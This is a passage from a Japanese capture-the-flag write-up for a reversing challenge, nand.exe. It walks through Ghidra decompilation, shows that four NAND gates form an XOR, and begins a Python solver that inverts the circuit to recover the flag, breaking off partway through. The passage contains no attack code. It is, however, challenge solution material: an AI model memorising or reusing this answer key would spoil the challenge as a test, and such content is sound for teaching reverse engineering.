+&lt;p>渡されるファイルは、&lt;code>nand.exe&lt;/code>と&lt;code>nand.pdb&lt;/code>です。&lt;code>.pdb&lt;/code>はソースコードのファイル名、シンボルなどのプログラムのデバッグ時に使用されるファイルです。&lt;code>nand.exe&lt;/code>は次のようなファイル形式でした。拡張子の通りPEファイルです。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">nand.exe: PE32+ executable (console) x86-64, for MS Windows
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ghidraで静的解析します。まず、&lt;code>main&lt;/code>関数です。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">_Argc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">_Argv&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">_Env&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="p">{&lt;/span>
+&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">_Str&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="kt">bool&lt;/span> &lt;span class="n">bVar1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">size_t&lt;/span> &lt;span class="n">sVar2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">ulonglong&lt;/span> &lt;span class="n">local_30&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">ulonglong&lt;/span> &lt;span class="n">local_28&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">ulonglong&lt;/span> &lt;span class="n">local_20&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">_Argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nl">s_Usage&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="n">s_&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="n">_14001e100&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">_Argv&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">_Str&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">_Argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;span class="n">sVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_Str&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sVar2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x20&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_28&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_28&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mh">0x20&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_28&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">local_28&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_30&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_30&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_30&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">local_30&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">InputSequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">local_30&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">local_28&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="p">)((&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">_Str&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">local_28&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_30&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x1f&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="n">CIRCUIT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">InputSequence&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">OutputSequence&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="n">bVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_20&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_20&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mh">0x100&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_20&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">local_20&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">bVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">bool&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">bVar1&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">OutputSequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">local_20&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">AnswerSequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">local_20&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">bVar1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s_Correct&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">_14001e118&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="n">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s_Wrong&lt;/span>&lt;span class="p">...&lt;/span>&lt;span class="n">_14001e128&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>ここから次のようなことが分かります。&lt;/p>
+&lt;ul>
+&lt;li>コマンドライン引数に入力した文字列(&lt;code>_Argv[1]&lt;/code>)の長さが0x20=32&lt;/li>
+&lt;li>入力した文字列をリトルエンディアンでバイナリに展開して&lt;code>InputSequence&lt;/code>に格納&lt;/li>
+&lt;li>&lt;code>CIRCUIT&lt;/code>関数に&lt;code>InputSequence&lt;/code>を入力して、&lt;code>OutputSequence&lt;/code>に出力している&lt;/li>
+&lt;li>&lt;code>OutputSequence&lt;/code>と&lt;code>AnswerSequence&lt;/code>を比較して全部一致していたら、入力した文字列がflag&lt;/li>
+&lt;/ul>
+&lt;p>さて、ここで実際に重要な処理を行っている箇所は&lt;code>CIRCUIT&lt;/code>関数であることが分かるので、&lt;code>CICRUIT&lt;/code>関数を見てみます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">CIRCUIT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uchar&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">uchar&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="p">{&lt;/span>
+&lt;span class="n">ulonglong&lt;/span> &lt;span class="n">local_28&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">ulonglong&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mh">0x1234&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_28&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_28&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mh">0xff&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">local_28&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">local_28&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="n">MODULE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">local_28&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">local_28&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">param_2&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">local_28&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="n">MODULE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">local_28&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="sc">&amp;#39;\x01&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">local_28&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x100&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>MODULE&lt;/code>関数を0x1234回だけ繰り返し呼び出しています。&lt;code>MODULE&lt;/code>関数も見てみます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">MODULE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uchar&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">uchar&lt;/span> &lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">uchar&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">param_3&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="p">{&lt;/span>
+&lt;span class="n">undefined&lt;/span> &lt;span class="n">auStack_38&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;span class="n">uchar&lt;/span> &lt;span class="n">local_18&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">uchar&lt;/span> &lt;span class="n">local_17&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">uchar&lt;/span> &lt;span class="n">local_16&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;span class="n">ulonglong&lt;/span> &lt;span class="n">local_10&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">local_10&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">__security_cookie&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ulonglong&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">auStack_38&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="n">NAND&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_18&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="n">NAND&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_18&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_16&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="n">NAND&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_18&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_17&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="n">NAND&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">local_16&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">local_17&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_3&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="n">__security_check_cookie&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">local_10&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ulonglong&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">auStack_38&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>NANDを4回だけ呼び出してます。これを数式と回路図に落とし込んでみます。
+&lt;img src="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/xor_circuit.png"
+width="672"
+height="221"
+srcset="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/xor_circuit_hu2d39ee020d3ce23cf486f494d30c6a22_26649_480x0_resize_box_3.png 480w, https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/xor_circuit_hu2d39ee020d3ce23cf486f494d30c6a22_26649_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="MODULE内部 回路図"
+class="gallery-image"
+data-flex-grow="304"
+data-flex-basis="729px"
+>
+数式は次の通りです。（記号は上記の図に合わせています）
+$$
+\begin{align}
+c &amp;amp;= \overline{\{\overline{(\overline{a\cdot b}) \cdot a}\}\cdot \{\overline{(\overline{a\cdot b}) \cdot b}\}} \nonumber \\
+&amp;amp;= \{(\overline{a\cdot b})\cdot a\} + \{(\overline{a\cdot b})\cdot b\} \nonumber \\
+&amp;amp;= \{(\overline{a} + \overline{b}) \cdot a\} + \{(\overline{a} + \overline{b}) \cdot b\} \nonumber \\
+&amp;amp;= \overline{a}\cdot a + a\cdot \overline{b} + \overline{a}\cdot b + \overline{b}\cdot b \nonumber \\
+&amp;amp;= a\cdot \overline{b} + \overline{a}\cdot b \nonumber \\
+&amp;amp;= a \oplus b
+\end{align}
+$$
+式(1)より&lt;code>MODULE&lt;/code>関数の数式を展開していくと、xor演算をしていることが分かります。
+これらのことから、&lt;code>CIRCUIT&lt;/code>関数は次のような操作を0x1234回繰り替えし行っていることが分かります。
+$$
+\begin{align}
+\mathrm{param2[local28]} &amp;amp;\leftarrow \mathrm{param1[local28]} \oplus \mathrm{param1[local28 + 1]} \ (\mathrm{local28} = 0 \cdots \mathrm{0xfe}) \nonumber \\
+\mathrm{param2[0xff]} &amp;amp;\leftarrow \mathrm{0xff} \oplus 1 \nonumber \\
+\mathrm{param1} &amp;amp;\leftarrow \mathrm{param2} \nonumber
+\end{align}
+$$
+xorの性質の一つである$a\oplus b \oplus b = a$を用いることで以上の演算の逆演算を行うことが可能です。ソルバーは次のようになりました。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">answer_sequence&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x01\x01\x01\x01\x01\x00\x00\x01\x01\x00\x00\x01\x00\x00\x01\x00\x00\x01\x01\x00\x00\x00\x00\x01\x01\x01\x01\x01\x00\x00\x01\x01\x01\x01\x00\x01\x00\x01\x01\x01\x00\x00\x00\x01\x01\x00\x01\x01\x01\x01\x00\x01\x00\x01\x00\x00\x01\x00\x01\x00\x01\x01\x00\x01\x00\x00\x01\x01\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x01\x00\x00\x01\x00\x01\x01\x01\x00\x00\x01\x01\x01\x00\x00\x01\x01\x01\x00\x01\x00\x01\x01\x01\x01\x00\x01\x01\x00\x00\x00\x01\x01\x00\x00\x01\x01\x00\x01\x01\x00\x00\x00\x01\x00\x01\x01\x01\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x01\x01\x00\x01\x00\x00\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x01\x00\x01\x00\x00\x01\x01\x00\x01\x01\x01\x00\x01\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x01\x01\x00\x01\x01\x00\x01\x01\x00\x01\x00\x01\x00\x01\x00\x00\x01\x01\x01\x01\x01\x00\x01\x01\x00\x01\x01\x01\x00\x00\x01\x00\x01\x01\x00\x01\x01\x00\x00\x01\x00\x00\x01\x01\x00\x00\x01\x01\x01\x00\x01\x00\x01\x00\x01\x01\x00&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
+&lt;span class="n">index_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">x&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x100&lt;/span>&lt;span class="p">)][::&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x1234&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">tmp_answer_sequence&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x100&lt;/span>&lt;span class="p">)]&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">index_list&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0xff&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">tmp_answer_sequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">answer_sequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">tmp_answer_sequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">answer_sequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">tmp_answer_sequence&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="n">answer_sequence&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tmp_answer_sequence&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">get_flag_str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flag_sequence&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x20&lt;/span>&lt;span class="p">):&lt;/span>
